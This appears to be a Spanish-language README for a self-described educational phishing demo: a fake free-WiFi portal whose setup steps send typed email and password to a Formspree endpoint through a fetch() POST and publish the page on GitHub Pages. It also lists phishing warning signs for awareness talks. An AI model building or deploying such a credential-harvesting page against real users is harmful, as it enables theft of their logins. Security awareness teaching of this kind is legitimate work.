# 📶 WiFi Gratis Principia - Proyecto Educativo de Phishing

⚠️ **ADVERTENCIA IMPORTANTE**: Este proyecto es **únicamente con fines educativos** para demostrar técnicas de phishing en presentaciones de seguridad informática. El uso malicioso de estas técnicas es **ilegal**.

## 🎯 Descripción

Página web de demostración que simula un portal de WiFi gratuito para educar sobre ataques de phishing y concienciar sobre seguridad informática.

## 🚀 Configuración Rápida (5 minutos)

### Opción 1: Formspree (Recomendado) ✅

**Formspree** es gratuito, confiable y no requiere backend. Gratis hasta 50 envíos/mes.

1. **Regístrate en Formspree**:
   - Ve a https://formspree.io/
   - Crea una cuenta gratis
   - Crea un nuevo formulario

2. **Obtén tu endpoint**:
   - Copia la URL que te dan (algo como `https://formspree.io/f/xyzabcde`)

3. **Configura en index.html**:
   - Abre `index.html` en un editor
   - Busca la línea: `const endpoint = 'TU_ENDPOINT_AQUI';`
   - Reemplaza con tu URL de Formspree
   - Descomenta las líneas de Formspree (quita los `//`)

   ```javascript
   // Dentro de la función enviarCredenciales(), reemplaza:
   const response = await fetch('https://formspree.io/f/xyzabcde', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(datos)
   });
   ```

4. **Verifica que funciona**:
   - Abre `index.html` en tu navegador
   - Haz clic en "Obtener WiFi Gratis"
   - Introduce credenciales de prueba
   - Ve a tu panel de Formspree para ver las credenciales capturadas

### Opción 2: Google Forms (Alternativa)

1. Crea un Google Form con campos "email" y "password"
2. Usa la URL de envío del formulario
3. Adapta el código para enviar a Google Forms

### Opción 3: Servicio propio (Avanzado)

Si quieres tu propio servidor, consulta la documentación de despliegue con Node.js.

## 📱 Desplegar en GitHub Pages

1. **Haz commit de los cambios**:
```bash
git add index.html
git commit -m "Configurar Formspree"
git push origin main
```

2. **Activa GitHub Pages**:
   - Ve a Settings > Pages en tu repositorio
   - Selecciona rama `main` como fuente
   - Guarda los cambios

3. **Accede a tu página**:
   - La URL será: `https://tu-usuario.github.io/wifi-phishing-attack`
   - Puede tardar 1-5 minutos en estar disponible

## 🎓 Uso en Presentaciones

Durante tu presentación de seguridad:

1. **Abre la página** en un proyector/pantalla
2. **Muestra el diseño** profesional del portal falso
3. **Introduce credenciales de prueba** en vivo
4. **Abre tu panel de Formspree** en otra pestaña
5. **Muestra en tiempo real** cómo se capturaron las credenciales
6. **Explica las señales de advertencia**:
   - URL sospechosa
   - Falta de HTTPS (candado)
   - Solicitud inesperada de credenciales
   - Diseño genérico

## 🔒 Señales de Phishing a Enseñar

- ✅ Verificar siempre la URL del sitio
- ✅ Buscar el candado HTTPS
- ✅ Desconfiar de ofertas "gratis" que piden credenciales
- ✅ Usar autenticación de dos factores
- ✅ No usar las mismas contraseñas en diferentes sitios

## ⚖️ Aviso Legal

**Este proyecto es solo para fines educativos**. 

- ✅ Usar en presentaciones educativas
- ✅ Usar en entornos controlados con permiso
- ✅ Enseñar a otros sobre seguridad
- ❌ NO usar para capturar credenciales reales
- ❌ NO usar sin consentimiento explícito
- ❌ NO usar con intenciones maliciosas

El uso malicioso de técnicas de phishing es **ilegal** y puede resultar en consecuencias legales graves.

---

**Desarrollado con fines educativos** | Seguridad Informática | 2026
